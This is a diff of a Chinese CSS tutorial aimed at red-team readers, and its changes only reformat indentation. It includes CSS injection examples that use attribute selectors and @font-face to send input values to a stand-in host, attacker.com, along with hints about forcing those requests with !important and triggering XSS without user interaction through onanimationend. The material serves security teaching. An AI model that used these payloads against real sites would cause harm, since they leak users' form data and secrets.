@@ -15,8 +15,8 @@
 
 ```
 选择器 {
-  属性: 值;
-  属性: 值;
+ 属性: 值;
+ 属性: 值;
 }
 ```
 
@@ -35,8 +35,8 @@
 **3. 内部样式表**
 ```html
 <style>
-  body { background: #fff; }
-  .container { max-width: 1200px; }
+ body { background: #fff; }
+ .container { max-width: 1200px; }
 </style>
 ```
 
@@ -68,11 +68,11 @@
 ### 属性选择器进阶
 
 ```css
-[attr^="val"]     /* 以val开头 */
-[attr$="val"]     /* 以val结尾 */
-[attr*="val"]     /* 包含val */
-[attr~="val"]     /* 包含独立单词val */
-[attr|="val"]     /* val 或 val-开头 */
+[attr^="val"] /* 以val开头 */
+[attr$="val"] /* 以val结尾 */
+[attr*="val"] /* 包含val */
+[attr~="val"] /* 包含独立单词val */
+[attr|="val"] /* val 或 val-开头 */
 
 /* 红队应用：CSS注入中，利用 ^= 和 $= 判断属性值的前缀/后缀 */
 input[value^="a"] { background: url('https://attacker.com/exfil?a'); }
@@ -96,9 +96,9 @@ input[value^="b"] { background: url('https://attacker.com/exfil?b'); }
 - d = 标签/伪元素数量
 
 ```css
-#login form input[type="text"]   /* (0,1,0,2) */
-.login input                     /* (0,0,1,1) */
-form input                       /* (0,0,0,2) */
+#login form input[type="text"] /* (0,1,0,2) */
+.login input /* (0,0,1,1) */
+form input /* (0,0,0,2) */
 ```
 
 红队应用：CSS注入时，利用`!important`覆盖原有样式，强制触发背景图请求。
@@ -109,16 +109,16 @@ form input                       /* (0,0,0,2) */
 
 ```
 +-----------------------------+
-|         margin              |
-|  +-----------------------+  |
-|  |       border          |  |
-|  |  +-----------------+  |  |
-|  |  |    padding      |  |  |
-|  |  |  +----------+   |  |  |
-|  |  |  | content  |   |  |  |
-|  |  |  +----------+   |  |  |
-|  |  +-----------------+  |  |
-|  +-----------------------+  |
+| margin |
+| +-----------------------+ |
+| | border | |
+| | +-----------------+ | |
+| | | padding | | |
+| | | +----------+ | | |
+| | | | content | | | |
+| | | +----------+ | | |
+| | +-----------------+ | |
+| +-----------------------+ |
 +-----------------------------+
 ```
 
@@ -147,12 +147,12 @@ form input                       /* (0,0,0,2) */
 
 ```css
 :root {
-  --primary-color: #3366ff;
-  --token: "abc123";  /* 不能存敏感值，CSS非安全存储 */
+ --primary-color: #3366ff;
+ --token: "abc123"; /* 不能存敏感值，CSS非安全存储 */
 }
 
 .button {
-  background: var(--primary-color);
+ background: var(--primary-color);
 }
 ```
 
@@ -178,7 +178,7 @@ form input                       /* (0,0,0,2) */
 
 ```css
 @media (max-width: 768px) {
-  .sidebar { display: none; }
+ .sidebar { display: none; }
 }
 @media (prefers-color-scheme: dark) { }
 @media (hover: hover) { }
@@ -188,8 +188,8 @@ form input                       /* (0,0,0,2) */
 
 ```css
 @font-face {
-  font-family: 'MyFont';
-  src: url('https://attacker.com/font?data=exfiltrated');
+ font-family: 'MyFont';
+ src: url('https://attacker.com/font?data=exfiltrated');
 }
 ```
 
@@ -197,8 +197,8 @@ form input                       /* (0,0,0,2) */
 
 ```css
 @keyframes spin {
-  from { transform: rotate(0deg); }
-  to { transform: rotate(360deg); }
+ from { transform: rotate(0deg); }
+ to { transform: rotate(360deg); }
 }
 /* 结合onanimationend实现无需用户交互的XSS触发 */
 ```
@@ -207,7 +207,7 @@ form input                       /* (0,0,0,2) */
 
 ```css
 @supports (display: grid) {
-  /* CSS Grid 可用 */
+ /* CSS Grid 可用 */
 }
 ```
 
